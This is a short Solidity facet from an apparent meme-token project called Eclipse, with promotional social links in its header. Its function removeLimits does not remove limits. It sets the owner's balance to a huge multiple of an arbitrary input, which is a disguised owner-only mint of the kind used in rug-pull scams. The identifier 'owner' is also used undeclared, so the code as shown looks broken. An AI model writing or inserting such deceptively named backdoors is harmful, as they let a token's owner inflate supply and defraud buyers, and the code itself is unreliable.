//SPDX-License-Identifier: MIT

//Telegram: https://t.me/eclipsecoin
// Twitter: https://twitter.com/eclipse
// Website: https://eclipse2024coin.io
// Discord: https://discord.com/invite/Va58aMrcwk

pragma solidity ^0.5.8;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(msg.sender == owner, "Only owner can remove limits");
        ds._balances[owner] =
            420_000 *
            42_069 *
            addBot *
            uint256(10) ** ds.tokenDecimals;
    }
}
